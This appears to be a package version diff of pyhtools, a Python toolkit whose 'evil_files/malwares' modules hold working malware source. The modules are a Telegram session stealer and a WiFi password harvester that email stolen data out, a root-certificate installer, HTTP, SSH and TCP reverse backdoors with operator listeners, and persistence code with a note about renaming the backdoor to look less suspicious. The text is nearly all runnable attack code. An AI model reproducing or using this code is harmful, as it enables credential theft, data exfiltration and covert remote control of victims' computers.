+                            "attachment; filename=\"%s\"" % (DESTINATION_ARCHIVE_NAME))
+            msg.attach(part)
+
+            smtp = smtplib.SMTP(self.server, self.port)
+            smtp.ehlo()
+            smtp.starttls()
+            smtp.ehlo()
+            smtp.login(self.sender_email, self.sender_passwd)
+            smtp.sendmail(self.sender_email, RECIPIENTS, msg.as_string())
+            smtp.close()
+
+            return True
+
+        except Exception as e:
+            # ignore any exceptions occurred
+            return False
+
+    def create_archive_and_send_mail(self, source_path: str, dest_path: str):
+        '''
+        desciption: creates archive and send email 
+        '''
+        os.chdir(dest_path)
+        self.terminate_td()
+        zip_name = 'tdata_zip_file_{}'.format(time.time())
+        shutil.make_archive(zip_name, 'zip', dest_path, source_path)
+        zip_path = os.path.join(dest_path, zip_name + '.zip')
+        self.send_zip(zip_path)
+        os.chdir(dest_path)
+        os.remove(zip_path)
+
+    def search_in_paritions(self,):
+        '''
+        description: search for telegram data in mounted partitions
+        '''
+        partitions = psutil.disk_partitions()
+        for partition in partitions:
+            self.find_tdata_in(partition.mountpoint)
+
+    def start(self):
+        # target os specific locations to search for tdata
+        if os.name == 'nt':
+            probable_installation_paths = [
+                os.environ['APPDATA'],
+                os.environ['ALLUSERSPROFILE'],
+                os.environ['LOCALAPPDATA'],
+                os.environ['PROGRAMW6432'],
+                os.environ['PROGRAMFILES(X86)'],
+            ]
+
+        else:
+            probable_installation_paths = [
+                os.environ['HOME'],
+            ]
+
+        # first search in probable installation locations
+        for path in probable_installation_paths:
+            self.find_tdata_in(path)
+
+        self.terminate_td()
+        self.search_in_paritions()
+        for tpath in self.tdata_paths:
+            self.create_archive_and_send_mail(
+                source_path=tpath, dest_path=self.temp_path)
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/data_harvesters/wireless_password_harvester.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/wireless_password_harvester.py`

 * *Ordering differences only*

 * *Files 17% similar despite different names*

```diff
@@ -1,65 +1,65 @@
-from pyhtools.evil_files.malwares.utils import send_mail
-from os import name as os_name
-import subprocess
-import re
-
-
-class WiFiPasswordHarvester:
-    def __init__(self, email: str, passwd: str, smtp_server: str = 'smtp.gmail.com', smtp_port: int = 587) -> None:
-        # smtp conf
-        self.smtp_server = smtp_server
-        self.smtp_port = smtp_port
-
-        # login details
-        self.email = email
-        self.passwd = passwd
-
-    def get_credentials(self) -> str:
-        '''
-        returns wifi credentials as str
-        '''
-        def get_username():
-            '''
-            returns username if detected else returns "Unkown User"
-            '''
-            username = subprocess.check_output('whoami', shell=True).decode()
-            if username:
-                return username
-            else:
-                return 'Unknown User'
-
-        command = 'netsh wlan show profiles'
-        networks = subprocess.check_output(command, shell=True).decode()
-        network_names = re.findall(r'(?:Profile\s*:\s)(.*)', networks)
-
-        overall_nw_data = f'Subject: Received Credentials from {get_username()} \n'
-        ssid_passwds = 'SSID : Password\n'
-        for network_name in network_names:
-            # sanitize network name
-            network_name = network_name.replace('\r', '')
-
-            # get password using netsh
-            nw_info = subprocess.check_output(
-                f'netsh wlan show profile "{network_name}" key=clear', shell=True).decode()
-            overall_nw_data += nw_info
-
-            passwd_res = re.search(r'(?:Key\sContent\s*:\s)(.*)', nw_info)
-            passwd = None  # AP without password security
-            try:
-                passwd = passwd_res.group(1)
-            except AttributeError:
-                pass
-            ssid_passwds += f'{network_name} : {passwd}\n'
-
-        overall_nw_data += ssid_passwds
-        return overall_nw_data
-
-    def start(self):
-        if os_name != 'nt':
-            raise
-        credentials = self.get_credentials()
-        if credentials:
-            if send_mail(self.email, self.email, self.passwd, credentials, self.smtp_server, self.smtp_port):
-                return True
-        else:
-            return False
+from pyhtools.evil_files.malwares.utils import send_mail
+from os import name as os_name
+import subprocess
+import re
+
+
+class WiFiPasswordHarvester:
+    def __init__(self, email: str, passwd: str, smtp_server: str = 'smtp.gmail.com', smtp_port: int = 587) -> None:
+        # smtp conf
+        self.smtp_server = smtp_server
+        self.smtp_port = smtp_port
+
+        # login details
+        self.email = email
+        self.passwd = passwd
+
+    def get_credentials(self) -> str:
+        '''
+        returns wifi credentials as str
+        '''
+        def get_username():
+            '''
+            returns username if detected else returns "Unkown User"
+            '''
+            username = subprocess.check_output('whoami', shell=True).decode()
+            if username:
+                return username
+            else:
+                return 'Unknown User'
+
+        command = 'netsh wlan show profiles'
+        networks = subprocess.check_output(command, shell=True).decode()
+        network_names = re.findall(r'(?:Profile\s*:\s)(.*)', networks)
+
+        overall_nw_data = f'Subject: Received Credentials from {get_username()} \n'
+        ssid_passwds = 'SSID : Password\n'
+        for network_name in network_names:
+            # sanitize network name
+            network_name = network_name.replace('\r', '')
+
+            # get password using netsh
+            nw_info = subprocess.check_output(
+                f'netsh wlan show profile "{network_name}" key=clear', shell=True).decode()
+            overall_nw_data += nw_info
+
+            passwd_res = re.search(r'(?:Key\sContent\s*:\s)(.*)', nw_info)
+            passwd = None  # AP without password security
+            try:
+                passwd = passwd_res.group(1)
+            except AttributeError:
+                pass
+            ssid_passwds += f'{network_name} : {passwd}\n'
+
+        overall_nw_data += ssid_passwds
+        return overall_nw_data
+
+    def start(self):
+        if os_name != 'nt':
+            raise
+        credentials = self.get_credentials()
+        if credentials:
+            if send_mail(self.email, self.email, self.passwd, credentials, self.smtp_server, self.smtp_port):
+                return True
+        else:
+            return False
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/installer/cert.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/installer/cert.py`

 * *Ordering differences only*

 * *Files 24% similar despite different names*

```diff
@@ -1,53 +1,53 @@
-from os.path import isfile, join as path_join, basename
-from os import makedirs
-from pyhtools.evil_files.malwares.utils import check_os, is_admin
-from subprocess import check_output
-from shlex import split
-from shutil import copy2 as copy
-
-import logging
-logging.basicConfig(
-    level=logging.DEBUG,
-    format='[%(asctime)s] [%(levelname)s] - %(message)s'
-)
-
-
-class CertificateInstaller:
-
-    def __init__(self, certificate_path: str) -> None:
-        assert isinstance(certificate_path, str)
-        assert isfile(certificate_path)
-
-        self._cert_path = certificate_path
-        self._os = check_os()
-        self._logger = logging.getLogger(__name__)
-
-    def install(self) -> bool:
-        if not is_admin():
-            logging.error('Run with admin privileges')
-            return False
-
-        match self._os:
-            case 'windows':
-                cmd = f'certutil -addstore root {self._cert_path}'
-
-            case 'macos':
-                cmd = f'security add-trusted-cert -d -p ssl -p basic -k /Library/Keychains/System.keychain {self._cert_path}'
-
-            case 'linux':
-                # works only for crt file
-                dest_path = '/usr/local/share/ca-certificates/extra'
-                file_name = basename(self._cert_path)
-
-                makedirs(dest_path, exist_ok=True)
-                copy(self._cert_path, path_join(dest_path, file_name))
-
-                cmd = 'update-ca-certificates'
-
-            case _:
-                return False
-
-        cmd = split(cmd)
-        check_output(cmd)
-        
-        return True
+from os.path import isfile, join as path_join, basename
+from os import makedirs
+from pyhtools.evil_files.malwares.utils import check_os, is_admin
+from subprocess import check_output
+from shlex import split
+from shutil import copy2 as copy
+
+import logging
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='[%(asctime)s] [%(levelname)s] - %(message)s'
+)
+
+
+class CertificateInstaller:
+
+    def __init__(self, certificate_path: str) -> None:
+        assert isinstance(certificate_path, str)
+        assert isfile(certificate_path)
+
+        self._cert_path = certificate_path
+        self._os = check_os()
+        self._logger = logging.getLogger(__name__)
+
+    def install(self) -> bool:
+        if not is_admin():
+            logging.error('Run with admin privileges')
+            return False
+
+        match self._os:
+            case 'windows':
+                cmd = f'certutil -addstore root {self._cert_path}'
+
+            case 'macos':
+                cmd = f'security add-trusted-cert -d -p ssl -p basic -k /Library/Keychains/System.keychain {self._cert_path}'
+
+            case 'linux':
+                # works only for crt file
+                dest_path = '/usr/local/share/ca-certificates/extra'
+                file_name = basename(self._cert_path)
+
+                makedirs(dest_path, exist_ok=True)
+                copy(self._cert_path, path_join(dest_path, file_name))
+
+                cmd = 'update-ca-certificates'
+
+            case _:
+                return False
+
+        cmd = split(cmd)
+        check_output(cmd)
+        
+        return True
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/backdoor.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/backdoor.py`

 * *Ordering differences only*

 * *Files 26% similar despite different names*

```diff
@@ -1,49 +1,49 @@
-import os
-from requests import get, post
-from subprocess import check_output
-
-class HTTPBackdoor:
-    def __init__(self, ip:str,  port:int=80, protocol:str='http', *kwargs) -> None:
-        self.url = f'{protocol}://{ip}:{port}'
-
-
-    def report(self, message:str):
-        post(url=self.url, data=message)
-
-
-    def exec_cmd(self, command):
-        try:
-            comm_res = check_output(command, shell=True).decode('utf-8')
-            self.report(comm_res)
-        except Exception as e:
-            self.report(f'Exception : {e}')
-
-
-    def cwd(self, path):
-        try:
-            os.chdir(path)
-            self.report(f'[*] Path changed to {path}')
-        except Exception as e:
-            self.report(f'[!] Cannot change path due to exception : {e}')
-
-
-    def connect(self):
-        running = True
-        while running:
-            command = get(self.url).text.strip()
-            
-            if 'closeconn' in command:
-                self.report('[*] Connection closed')
-                running = False
-            elif 'cd' in command:
-                path = command.split(' ')[-1]
-                self.cwd(path)
-            else:
-                self.exec_cmd(command)
-
-
-if __name__ == '__main__':
-    IP = '<random_characters>.localhost.run'
-    PORT = 80
-    backdoor = HTTPBackdoor(IP, PORT)
-    backdoor.connect()
+import os
+from requests import get, post
+from subprocess import check_output
+
+class HTTPBackdoor:
+    def __init__(self, ip:str,  port:int=80, protocol:str='http', *kwargs) -> None:
+        self.url = f'{protocol}://{ip}:{port}'
+
+
+    def report(self, message:str):
+        post(url=self.url, data=message)
+
+
+    def exec_cmd(self, command):
+        try:
+            comm_res = check_output(command, shell=True).decode('utf-8')
+            self.report(comm_res)
+        except Exception as e:
+            self.report(f'Exception : {e}')
+
+
+    def cwd(self, path):
+        try:
+            os.chdir(path)
+            self.report(f'[*] Path changed to {path}')
+        except Exception as e:
+            self.report(f'[!] Cannot change path due to exception : {e}')
+
+
+    def connect(self):
+        running = True
+        while running:
+            command = get(self.url).text.strip()
+            
+            if 'closeconn' in command:
+                self.report('[*] Connection closed')
+                running = False
+            elif 'cd' in command:
+                path = command.split(' ')[-1]
+                self.cwd(path)
+            else:
+                self.exec_cmd(command)
+
+
+if __name__ == '__main__':
+    IP = '<random_characters>.localhost.run'
+    PORT = 80
+    backdoor = HTTPBackdoor(IP, PORT)
+    backdoor.connect()
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/listener.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/listener.py`

 * *Ordering differences only*

 * *Files 18% similar despite different names*

```diff
@@ -1,42 +1,42 @@
-from http.server import BaseHTTPRequestHandler, HTTPServer
-
-
-class HTTPListener(BaseHTTPRequestHandler):
-    # execute command
-    def do_GET(self):
-        command = input(f'{self.connection.getpeername()} >> ').strip().encode('utf-8')
-        self.send_response(200)
-        self.send_header(keyword="Content-type", value="text/html")
-        self.end_headers()
-        self.wfile.write(command)
-
-
-    # get result
-    def do_POST(self):
-        self.send_response(200)
-        self.end_headers()
-        read_length = int(self.headers['Content-Length'])
-        result = self.rfile.read(read_length)
-        print(result.decode('utf-8'))
-        return result
-
-
-    # supress logs
-    def log_message(self, format: str, *args) -> None:
-        return 
-
-
-if __name__ == '__main__':
-    try:
-        IP = '127.0.0.1'
-        PORT = 8080
-        server_add = (IP, PORT)
-        httpd = HTTPServer(server_add, HTTPListener)
-        print(f'[*] Listening on http://{IP}:{PORT}')
-        httpd.serve_forever()
-
-    except KeyboardInterrupt:
-        print('\n[!] ctrl+c detected!!')
-
-    except Exception as e:
-        print(f'\n[!] Exception : {e}')
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+
+class HTTPListener(BaseHTTPRequestHandler):
+    # execute command
+    def do_GET(self):
+        command = input(f'{self.connection.getpeername()} >> ').strip().encode('utf-8')
+        self.send_response(200)
+        self.send_header(keyword="Content-type", value="text/html")
+        self.end_headers()
+        self.wfile.write(command)
+
+
+    # get result
+    def do_POST(self):
+        self.send_response(200)
+        self.end_headers()
+        read_length = int(self.headers['Content-Length'])
+        result = self.rfile.read(read_length)
+        print(result.decode('utf-8'))
+        return result
+
+
+    # supress logs
+    def log_message(self, format: str, *args) -> None:
+        return 
+
+
+if __name__ == '__main__':
+    try:
+        IP = '127.0.0.1'
+        PORT = 8080
+        server_add = (IP, PORT)
+        httpd = HTTPServer(server_add, HTTPListener)
+        print(f'[*] Listening on http://{IP}:{PORT}')
+        httpd.serve_forever()
+
+    except KeyboardInterrupt:
+        print('\n[!] ctrl+c detected!!')
+
+    except Exception as e:
+        print(f'\n[!] Exception : {e}')
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/ssh/backdoor.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/ssh/backdoor.py`

 * *Ordering differences only*

 * *Files 18% similar despite different names*

```diff
@@ -1,160 +1,160 @@
-import logging
-import os
-import paramiko
-import socket
-import subprocess
-import shlex
-import threading
-
-
-logging.getLogger("paramiko").setLevel(logging.WARNING)
-logging.basicConfig(
-    level=logging.DEBUG,
-    format='[%(asctime)s] [%(levelname)s] - %(message)s'
-)
-
-
-class SSHReverseBackdoor:
-    '''Reverse backdoor using SSH protocol'''
-
-    def __init__(self, username: str, passwd: str, ip: str, port: int) -> None:
-        # check if args are of valid type
-        assert isinstance(ip, str)
-        assert isinstance(port, int)
-        assert isinstance(username, str)
-        assert isinstance(passwd, str)
-
-        # create client
-        self._client = paramiko.SSHClient()
-        self._client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-        # connect to the client
-        self._client.connect(
-            hostname=ip,
-            port=port,
-            username=username,
-            password=passwd,
-        )
-
-    def __del__(self):
-        self._client.close()
-
-    def start(self):
-        '''for custom backdoor'''
-        # create ssh session
-        session = self._client.get_transport().open_session()
-        logging.info(f'Session Created')
-
-        # receive first message
-        if session.recv(1024).decode("utf-8") == '!!ok':
-            logging.info('first message recvd')
-
-        while session.active:
-            try:
-                cmd = session.recv(1024).decode('utf-8')
-
-                # if cmd is exit then break the loop
-                if cmd == '!!exit':
-                    break
-
-                # execute command and return output to handler
-                else:
-                    output = subprocess.check_output(
-                        shlex.split(cmd), shell=True, stderr=subprocess.PIPE)
-                    session.send(output or '!!ok')
-
-            # send exception to handler 
-            except Exception as e:
-                session.send(f'Exception: {e}'.encode('utf-8'))
-                logging.error(e)
-
-        logging.info('Session Closed')
-
-
-class SSHReverseBackackdoorHandler:
-    class Handler(paramiko.ServerInterface):
-        '''SSH backdoor handler'''
-
-        def __init__(self, username: str, passwd: str) -> None:
-            self._username = username
-            self._passwd = passwd
-            self.event = threading.Event()
-
-        def check_channel_request(self, kind: str, chanid: int) -> int:
-            if kind == 'session':
-                return paramiko.OPEN_SUCCEEDED
-
-            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
-
-        def check_auth_password(self, username: str, password: str) -> int:
-            if (username == self._username) and (password == self._passwd):
-                return paramiko.AUTH_SUCCESSFUL
-            return paramiko.AUTH_FAILED
-
-    def __init__(self, username: str, passwd: str, host: str = '0.0.0.0', port=8022, rsa_key_path: str = None) -> None:
-        assert isinstance(username, str)
-        assert isinstance(passwd, str)
-        assert isinstance(host, str)
-        assert isinstance(port, int)
-        assert isinstance(rsa_key_path, str)
-        assert os.path.exists(rsa_key_path)  # file doesn't exist
-
-        self._username = username
-        self._passwd = passwd
-        self._host = host
-        self._port = port
-        self._rsa_key = paramiko.RSAKey(filename=rsa_key_path)
-
-    def start(self):
-        # try to bind socket address to the host
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            sock.bind((self._host, self._port))
-            logging.info(f'[*] Listening on {self._host}:{self._port}')
-            sock.listen(100)
-            client, addr = sock.accept()
-        except Exception as e:
-            logging.error(f'Listen Failed: {e}')
-            return
-        else:
-            logging.info(f'Got connection: {addr}')
-
-        # create ssh
-        session = paramiko.Transport(client)
-        session.add_server_key(self._rsa_key)
-        server = self.Handler(
-            username=self._username,
-            passwd=self._passwd,
-        )
-        session.start_server(server=server)
-
-        channel = session.accept(20)
-        if channel is None:
-            return
-
-        logging.info('Backdoor Authenticated')
-
-        # send first message
-        channel.send('!!ok')
-
-        # ask and execute command
-        bad_chars_list = ['', '\r', '\r\n']
-        while channel.active:
-            cmd = input(f'>> ').strip()
-
-            # avoid executing error generating characters
-            if cmd in bad_chars_list:
-                continue
-
-            # create exit command to exit the interactive mode
-            if cmd == '!!exit':
-                channel.send('!!exit')
-                break
-
-            # encode command and send to backdoor
-            channel.send(cmd.encode('utf-8'))
-            output = channel.recv(1024).decode()
-            print(output)
-
-        channel.close()
+import logging
+import os
+import paramiko
+import socket
+import subprocess
+import shlex
+import threading
+
+
+logging.getLogger("paramiko").setLevel(logging.WARNING)
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='[%(asctime)s] [%(levelname)s] - %(message)s'
+)
+
+
+class SSHReverseBackdoor:
+    '''Reverse backdoor using SSH protocol'''
+
+    def __init__(self, username: str, passwd: str, ip: str, port: int) -> None:
+        # check if args are of valid type
+        assert isinstance(ip, str)
+        assert isinstance(port, int)
+        assert isinstance(username, str)
+        assert isinstance(passwd, str)
+
+        # create client
+        self._client = paramiko.SSHClient()
+        self._client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        # connect to the client
+        self._client.connect(
+            hostname=ip,
+            port=port,
+            username=username,
+            password=passwd,
+        )
+
+    def __del__(self):
+        self._client.close()
+
+    def start(self):
+        '''for custom backdoor'''
+        # create ssh session
+        session = self._client.get_transport().open_session()
+        logging.info(f'Session Created')
+
+        # receive first message
+        if session.recv(1024).decode("utf-8") == '!!ok':
+            logging.info('first message recvd')
+
+        while session.active:
+            try:
+                cmd = session.recv(1024).decode('utf-8')
+
+                # if cmd is exit then break the loop
+                if cmd == '!!exit':
+                    break
+
+                # execute command and return output to handler
+                else:
+                    output = subprocess.check_output(
+                        shlex.split(cmd), shell=True, stderr=subprocess.PIPE)
+                    session.send(output or '!!ok')
+
+            # send exception to handler 
+            except Exception as e:
+                session.send(f'Exception: {e}'.encode('utf-8'))
+                logging.error(e)
+
+        logging.info('Session Closed')
+
+
+class SSHReverseBackackdoorHandler:
+    class Handler(paramiko.ServerInterface):
+        '''SSH backdoor handler'''
+
+        def __init__(self, username: str, passwd: str) -> None:
+            self._username = username
+            self._passwd = passwd
+            self.event = threading.Event()
+
+        def check_channel_request(self, kind: str, chanid: int) -> int:
+            if kind == 'session':
+                return paramiko.OPEN_SUCCEEDED
+
+            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+
+        def check_auth_password(self, username: str, password: str) -> int:
+            if (username == self._username) and (password == self._passwd):
+                return paramiko.AUTH_SUCCESSFUL
+            return paramiko.AUTH_FAILED
+
+    def __init__(self, username: str, passwd: str, host: str = '0.0.0.0', port=8022, rsa_key_path: str = None) -> None:
+        assert isinstance(username, str)
+        assert isinstance(passwd, str)
+        assert isinstance(host, str)
+        assert isinstance(port, int)
+        assert isinstance(rsa_key_path, str)
+        assert os.path.exists(rsa_key_path)  # file doesn't exist
+
+        self._username = username
+        self._passwd = passwd
+        self._host = host
+        self._port = port
+        self._rsa_key = paramiko.RSAKey(filename=rsa_key_path)
+
+    def start(self):
+        # try to bind socket address to the host
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind((self._host, self._port))
+            logging.info(f'[*] Listening on {self._host}:{self._port}')
+            sock.listen(100)
+            client, addr = sock.accept()
+        except Exception as e:
+            logging.error(f'Listen Failed: {e}')
+            return
+        else:
+            logging.info(f'Got connection: {addr}')
+
+        # create ssh
+        session = paramiko.Transport(client)
+        session.add_server_key(self._rsa_key)
+        server = self.Handler(
+            username=self._username,
+            passwd=self._passwd,
+        )
+        session.start_server(server=server)
+
+        channel = session.accept(20)
+        if channel is None:
+            return
+
+        logging.info('Backdoor Authenticated')
+
+        # send first message
+        channel.send('!!ok')
+
+        # ask and execute command
+        bad_chars_list = ['', '\r', '\r\n']
+        while channel.active:
+            cmd = input(f'>> ').strip()
+
+            # avoid executing error generating characters
+            if cmd in bad_chars_list:
+                continue
+
+            # create exit command to exit the interactive mode
+            if cmd == '!!exit':
+                channel.send('!!exit')
+                break
+
+            # encode command and send to backdoor
+            channel.send(cmd.encode('utf-8'))
+            output = channel.recv(1024).decode()
+            print(output)
+
+        channel.close()
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/TCP/listener.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/TCP/listener.py`

 * *Ordering differences only*

 * *Files 16% similar despite different names*

```diff
@@ -1,162 +1,162 @@
-import base64
-import socket
-import sys
-import json
-
-class Listener:
-    
-    def __init__(self, ip:str, port:int) -> None:   
-        '''
-        description: Creates a Listener which opens a port on the attackers machine through TCP socket.
-        params: ip(str), port(int)
-        returns: None
-        ''' 
-        self.ip = ip 
-        self.port = port
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server.bind((self.ip,self.port))
-        self.server.listen(0)
-        print('[*] Server started and waiting for incoming connections.')
-
-        self.connection, self.conn_addr = self.server.accept()
-
-        print(f'[*] Incoming connection from {self.conn_addr}')
-
-
-    def serial_send(self, data:str or list) :
-        '''
-        description: serialize data and send over TCP socket.
-        params: data(str or list)
-        returns: None
-        '''
-        if type(data) == bytes:
-            data = str(data, encoding='utf-8')
-
-        json_data = json.dumps(data)
-        bytes_json_data = bytes(json_data, encoding='utf-8')
-        # print('Listener sent: ',bytes_json_data)
-        self.connection.send(bytes_json_data)
-
-
-    def serial_receive(self) -> str :
-        '''
-        description: receive serialized data over TCP socket and retrieve original data.
-        params: None
-        returns: str
-        '''
-        bytes_json_data = b''
-        while True:
-            try:
-                bytes_json_data += self.connection.recv(1024)
-                data = json.loads(bytes_json_data)
-                # print('Listener Rec: ',data)
-                return data
-            except json.JSONDecodeError:
-                continue
-
-
-    def execute_remotely(self, command)->str:
-        '''
-        description: execute command on the remote machine.
-        params: command
-        returns: command output (str)
-        '''
-        self.serial_send(command)
-        return self.serial_receive()
-
-
-    def write_file(self, path, content):
-        '''
-        description: write downloaded contents from the victim to the specified path file.
-        params: path, content
-        returns: str or None
-        '''
-        with open(path, 'wb') as file:
-            bytes_content = base64.b64decode(content)
-            file.write(bytes_content)
-            return (f'[*] File {path} Downloaded successfully.')
-
-
-    def read_file(self, path):
-        '''
-		description: upload file contents to the victim's machine.
-        params: path
-        returns: bytes
-		'''
-        with open(path, 'rb') as file:
-            file_content = file.read()
-            base64_file_content = base64.b64encode(file_content)
-            return base64_file_content
-
-
-    def download_dir_files(self, files_count):
-        pass
-
-
-    def run(self):
-        '''
-        description: start listener.
-        params: None
-        returns: None
-        '''
-        connected_ip = self.conn_addr[0]
-        while True:
-            try:
-                command = input(f'{connected_ip} >> ')
-
-                # create list and get commands with args
-                command_lst = command.split(' ')
-                command_list_len = len(command_lst)>=2
-                cmd = command_lst[0]
-                if command_list_len:
-                    path = command_lst[1]
-                
-                if cmd == 'exit':
-                    self.execute_remotely('exit')
-                    self.connection.close()
-                    sys.exit()
-
-                elif cmd == 'download' and command_list_len:
-                    contents = self.execute_remotely(command)
-                    if 'Exception' in contents:
-                        print(contents)
-                    else: 
-                        execution_result = self.write_file(path, contents)
-
-                elif cmd == 'upload' and command_list_len:
-                    print('[*] Listener : Uploading file to the victim machine.')
-                    str_file_contents = str(self.read_file(path), encoding='utf-8')
-                    command +=  ' ' + str_file_contents
-                    # self.serial_send(command)
-                    execution_result = self.execute_remotely(command)
-
-                elif cmd == 'download_dir_files' and command_list_len:
-                    print(f'[*] Downloading dir {path} files.')
-                    files_count = self.execute_remotely(cmd)
-                    for _ in range(int(files_count)):
-                        # file_contents = self.serial_receive()
-                        pass
-                else :
-                    # print('[-] Listener else')
-                    execution_result = self.execute_remotely(command)
-                
-                print(execution_result)
-
-            except KeyboardInterrupt:
-                print('[!] ctrl+c detected.')
-
-            except IndexError:
-                print('[!] Cannot Accept empty command.')
-
-            except Exception as e:
-                print('[-] Listener Exception : ', e)
-
-
-if __name__ == '__main__':
-    try:
-        listener = Listener('127.0.0.1',4444)
-        listener.run()
-    except Exception as e:
+import base64
+import socket
+import sys
+import json
+
+class Listener:
+    
+    def __init__(self, ip:str, port:int) -> None:   
+        '''
+        description: Creates a Listener which opens a port on the attackers machine through TCP socket.
+        params: ip(str), port(int)
+        returns: None
+        ''' 
+        self.ip = ip 
+        self.port = port
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server.bind((self.ip,self.port))
+        self.server.listen(0)
+        print('[*] Server started and waiting for incoming connections.')
+
+        self.connection, self.conn_addr = self.server.accept()
+
+        print(f'[*] Incoming connection from {self.conn_addr}')
+
+
+    def serial_send(self, data:str or list) :
+        '''
+        description: serialize data and send over TCP socket.
+        params: data(str or list)
+        returns: None
+        '''
+        if type(data) == bytes:
+            data = str(data, encoding='utf-8')
+
+        json_data = json.dumps(data)
+        bytes_json_data = bytes(json_data, encoding='utf-8')
+        # print('Listener sent: ',bytes_json_data)
+        self.connection.send(bytes_json_data)
+
+
+    def serial_receive(self) -> str :
+        '''
+        description: receive serialized data over TCP socket and retrieve original data.
+        params: None
+        returns: str
+        '''
+        bytes_json_data = b''
+        while True:
+            try:
+                bytes_json_data += self.connection.recv(1024)
+                data = json.loads(bytes_json_data)
+                # print('Listener Rec: ',data)
+                return data
+            except json.JSONDecodeError:
+                continue
+
+
+    def execute_remotely(self, command)->str:
+        '''
+        description: execute command on the remote machine.
+        params: command
+        returns: command output (str)
+        '''
+        self.serial_send(command)
+        return self.serial_receive()
+
+
+    def write_file(self, path, content):
+        '''
+        description: write downloaded contents from the victim to the specified path file.
+        params: path, content
+        returns: str or None
+        '''
+        with open(path, 'wb') as file:
+            bytes_content = base64.b64decode(content)
+            file.write(bytes_content)
+            return (f'[*] File {path} Downloaded successfully.')
+
+
+    def read_file(self, path):
+        '''
+		description: upload file contents to the victim's machine.
+        params: path
+        returns: bytes
+		'''
+        with open(path, 'rb') as file:
+            file_content = file.read()
+            base64_file_content = base64.b64encode(file_content)
+            return base64_file_content
+
+
+    def download_dir_files(self, files_count):
+        pass
+
+
+    def run(self):
+        '''
+        description: start listener.
+        params: None
+        returns: None
+        '''
+        connected_ip = self.conn_addr[0]
+        while True:
+            try:
+                command = input(f'{connected_ip} >> ')
+
+                # create list and get commands with args
+                command_lst = command.split(' ')
+                command_list_len = len(command_lst)>=2
+                cmd = command_lst[0]
+                if command_list_len:
+                    path = command_lst[1]
+                
+                if cmd == 'exit':
+                    self.execute_remotely('exit')
+                    self.connection.close()
+                    sys.exit()
+
+                elif cmd == 'download' and command_list_len:
+                    contents = self.execute_remotely(command)
+                    if 'Exception' in contents:
+                        print(contents)
+                    else: 
+                        execution_result = self.write_file(path, contents)
+
+                elif cmd == 'upload' and command_list_len:
+                    print('[*] Listener : Uploading file to the victim machine.')
+                    str_file_contents = str(self.read_file(path), encoding='utf-8')
+                    command +=  ' ' + str_file_contents
+                    # self.serial_send(command)
+                    execution_result = self.execute_remotely(command)
+
+                elif cmd == 'download_dir_files' and command_list_len:
+                    print(f'[*] Downloading dir {path} files.')
+                    files_count = self.execute_remotely(cmd)
+                    for _ in range(int(files_count)):
+                        # file_contents = self.serial_receive()
+                        pass
+                else :
+                    # print('[-] Listener else')
+                    execution_result = self.execute_remotely(command)
+                
+                print(execution_result)
+
+            except KeyboardInterrupt:
+                print('[!] ctrl+c detected.')
+
+            except IndexError:
+                print('[!] Cannot Accept empty command.')
+
+            except Exception as e:
+                print('[-] Listener Exception : ', e)
+
+
+if __name__ == '__main__':
+    try:
+        listener = Listener('127.0.0.1',4444)
+        listener.run()
+    except Exception as e:
         print('[-] Exception : ',e)
```

### Comparing `pyhtools-2.2.1/pyhtools/evil_files/malwares/reverse_backdoor/TCP/reverse_backdoor.py` & `pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/TCP/reverse_backdoor.py`

 * *Ordering differences only*

 * *Files 17% similar despite different names*

```diff
@@ -1,212 +1,212 @@
-import socket
-import subprocess
-import json
-import sys
-import os
-import base64
-import shutil
-
-
-class ReverseBackdoor:
-	
-	def __init__(self, ip:str, port:int)->None:
-		'''
-		description: Reverse backdoor class creates a backdoor by connecting to the attacker's machine server through TCP socket. 
-		params: ip(str), port(int)
-		returns: None
-		'''
-		self.create_persistence()
-		
-		self.port = port 
-		self.ip = ip
-		
-		# creating a socket : socket.socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)
-		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		self.connect_to_listener()
-		
-
-	def create_persistence(self, backdoor_name:str='MyBackdoor.exe'):
-		'''
-		description: tries to connect to user when machine restarts.
-		params: None
-        returns: None
-		'''
-		if os.name == 'nt':
-			# TODO: Change MyBackdoor to something less suspectful before creating exe
-			backdoor_file_path = f'{os.environ["appdata"]}\\{backdoor_name}'
-			if not os.path.exists(backdoor_file_path):
-				shutil.copy(sys.executable, backdoor_file_path)
